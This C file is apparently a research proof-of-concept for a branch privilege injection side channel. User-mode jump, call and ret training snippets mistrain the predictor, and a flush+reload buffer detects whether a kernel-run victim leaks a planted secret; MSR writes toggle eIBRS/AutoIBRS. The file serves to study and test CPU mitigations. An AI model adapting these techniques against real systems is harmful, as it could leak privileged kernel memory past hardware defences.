// SPDX-License-Identifier: GPL-3.0-only
/*
 * Investigate $BPRC_{U \rightarrow K}$
 */

#include <err.h>
#include <syscall.h>
#include <unistd.h>

#include "ap_ioctl.h"
#include "bp_tools.h"
#include "memtools.h"
#include "msr.h"
#include "stats.h"

#define RB_OFFSET 0xcc0
#define RB_STRIDE (4096 + 256) // reduce false positives on Gracemont
#include "rb_tools.h"

#define NUM_ROUNDS 100000
#define MAX_ATTEMPTS 8

typedef struct registers
{
    u64 src_ptr;     // code snip that contains the jump instruction
    u64 dst_ptr_ptr; // jump target

    u64 memory_ptr;
} registers_t;

typedef struct exp_params
{
    u64 src;
    u64 src_size;
} exp_params_t;

typedef struct run_params
{
    registers_t *train;
    registers_t *victim;
} run_params_t;

typedef struct exp_res
{
    u64 hits;
    u64 check;
} exp_res_t;

// clang-format off
mk_snip(train_src_jump,
    BHB_SETUP(194, 0x10 - 2)
    // increase speculation window
    "clflush (%rbx)\n"
    "lfence\n"
    // mistrained jump
    "jmp *(%rbx)\n"
    // never return here
    "int3\n"
);
mk_snip(train_src_call,
    BHB_SETUP(194, 0x10 - 2)
    // increase speculation window
    "clflush (%rbx)\n"
    "lfence\n"
    // mistrained call
    "call *(%rbx)\n"
    "ret\n"
    "int3\n"
);
mk_snip(train_src_ret,
    ".rept 16\n"
    "lea 1f(%rip), %r8\n"
    "pushq  %r8       \n"
    "ret\n"
    "1:\n"
    ".endr\n"

    // put in some distance between the underflow and the victim to avoid tainting the BTB
    ".rept 32\n"
    "nop\n"
    ".endr\n"

    "pushq (%rbx)\n"
    BHB_SETUP(194, 0x10 - 2)
    // increase speculation window
    "clflush (%rsp)\n"
    "lfence\n"
    // mistrained ret
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(train_dst,
    // disclosure gadget
    "add $"STR(RB_OFFSET)", %rcx\n"
    "mov (%rcx), %rcx\n"
    // privilege domain change to induce branch privilige injection
    "syscall\n"
    ".rept 32\n"
    "nop\n"
    ".endr\n"
    "ret\n"
    "int3\n"
);
// clang-format on

// clang-format off
mk_snip(victim_dst,
    "lfence\n"
    "ret\n"
    "int3       \n"
);
// clang-format on


void run_snip_call(void *v)
{
    struct registers *r = v;

    // clang-format off
    asm volatile(
        "call *%%rdx\n"
        :
        : "d"(r->src_ptr), "b"(r->dst_ptr_ptr), "c"(r->memory_ptr)
        : "r8", "memory", "flags");
    // clang-format on
}

// outside the function to make sure compiler does not optimize it away
struct ap_payload p;
void run_exp_once(run_params_t *params)
{
    // params
    registers_t *train = params->train;
    registers_t *victim = params->victim;

    p.fptr = run_snip_call;
    p.data = victim;

    rb_reset();
    // isolate the measurements from the setup
    for (volatile int i = 0; i < 100000; ++i)
        ;

    for (int attempt = 0; attempt < MAX_ATTEMPTS; ++attempt)
    {
        rb_flush();

        // clang-format off
        asm volatile(
            "lea 1f(%%rip), %%r11\n"
            "pushq %%r11\n"
            "jmp *%0\n" // we can use a call here but it decreases the signal
            "1:\n"
            :
            : "r"(train->src_ptr), "b"(train->dst_ptr_ptr), "c"(train->memory_ptr)
            , "a"(SYS_ioctl), "D"(fd_ap), "S"(AP_IOCTL_RUN), "d"(&p) // ioctl params to run victim
            : "r8", "r11", "memory");
        // clang-format on

        // we need this to reduce false positives on alderlake
        for (volatile int i = 0; i < 10000; ++i)
            ;
        rb_reload();
    }
}

const u64 dummy_memory;
void run_exp(exp_params_t *params, exp_res_t *exp_res)
{
    // build the set of code snippets in advance
    code_snip_t train_src_snip;
    code_snip_t train_dst_snip;
    code_snip_t victim_dst_snip;

    // place the victim destination anywhere
    u64 victim_dst_addr;
    do
    {
        victim_dst_addr = rand47();
    } while (init_snip(&victim_dst_snip, victim_dst_addr, victim_dst));

    // place the training source anywhere
    u64 train_src_addr;
    do
    {
        train_src_addr = rand47();
    } while (map_code(&train_src_snip, train_src_addr, _ptr(params->src), params->src_size));

    // place the training destination close enough to the source for BTB predictions to occur
    u64 train_dst_addr;
    do
    {
        train_dst_addr = (train_src_addr & 0x7FFFFF000000ul) | (rand47() & 0xFFFFFFul);
    } while (init_snip(&train_dst_snip, train_dst_addr, train_dst));

    // randomize the reload buffer slot for detection
    int secret = rand() % RB_SLOTS;

    // prepare the training and victim parameters
    registers_t train;
    registers_t victim;

    victim.src_ptr = train_src_addr;
    victim.dst_ptr_ptr = _ul(&victim_dst_snip.ptr_u64);
    victim.memory_ptr = RB_PTR + secret * RB_STRIDE;

    train.src_ptr = train_src_addr;
    train.dst_ptr_ptr = _ul(&train_dst_snip.ptr_u64);
    train.memory_ptr = _ul(&dummy_memory) - RB_OFFSET;

    run_params_t run_params = {
        .train = &train,
        .victim = &victim,
    };

    run_exp_once(&run_params);

    exp_res->hits = rb_hist[secret];
    exp_res->check = rb_hist[(secret + 1) % RB_SLOTS];

    junmap(&train_dst_snip);
    junmap(&train_src_snip);
    junmap(&victim_dst_snip);
}

u64 results[NUM_ROUNDS] = {0};
void evaluate_experiment(exp_params_t *params, char *label_prefix)
{
    INFO("running %s\n", label_prefix);
    u64 check = 0; // count false positives
    for (int r = 0; r < NUM_ROUNDS; ++r)
    {
        exp_res_t exp_res;

        run_exp(params, &exp_res);

        results[r] = exp_res.hits;
        check += exp_res.check;
    }

    // print statistics
    stats_results_start();
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_median", stats_median_u64(results, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_f64("hits_per_round_avg", stats_avg_u64(results, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_count_gt0", stats_count_u64(results, NUM_ROUNDS, &stats_pred_gt0));
    printf("%s", label_prefix);
    stats_print_u64("hits_per_round_sum", stats_sum_u64(results, NUM_ROUNDS));
    printf("%s", label_prefix);
    stats_print_u64("check", check);
    stats_results_end();
    fflush(stdout);
}

int main(int argc, char *argv[])
{
    srandom(getpid());

    msr_init();
    rb_init();
    ap_init();

    // make sure the eIBRS or AutoIBRS is enabled
#if defined(MARCH_ZEN4)
    // Zen4 enable AutoIBRS
    msr_params_t msr_params = {
        .msr_nr = MSR_EFER,
        .msr_value = 0,
    };
    ap_run((void (*)(void *))msr_rdmsr, &msr_params);
    msr_params.msr_value |= AIBRSE_MASK;
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#elif defined(MARCH_ZEN5)
    // Zen5 clear AutoIBRS bit as Zen 5 has protection even without
    msr_params_t msr_params = {
        .msr_nr = MSR_EFER,
        .msr_value = 0,
    };
    ap_run((void (*)(void *))msr_rdmsr, &msr_params);
    msr_params.msr_value &= ~AIBRSE_MASK;
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#else
    // allow providing a custom msr value for mitigation testing
    u64 msr_value = IBRS_MASK;
    if(argc > 1) {
        sscanf(argv[1], "0x%lx", &msr_value);
        INFO("Using custom msr value: 0x%lx\n", msr_value);
    }

    // Intel make sure eIBRS is enabled and nothing else
    msr_params_t msr_params = {
        .msr_nr = MSR_IA32_SPEC_CTRL,
        .msr_value = msr_value,
    };
    ap_run((void (*)(void *))msr_wrmsr, &msr_params);
#endif

    INFO("finding leaks\n");

    // run the experiment for all types of instructions

    exp_params_t params_jump = {
        .src = _ul(train_src_jump__snip),
        .src_size = snip_sz(train_src_jump),
    };
    evaluate_experiment(&params_jump, "jump_");

    exp_params_t params_call = {
        .src = _ul(train_src_call__snip),
        .src_size = snip_sz(train_src_call),
    };
    evaluate_experiment(&params_call, "call_");

    exp_params_t params_ret = {
        .src = _ul(train_src_ret__snip),
        .src_size = snip_sz(train_src_ret),
    };
    evaluate_experiment(&params_ret, "ret_");
}
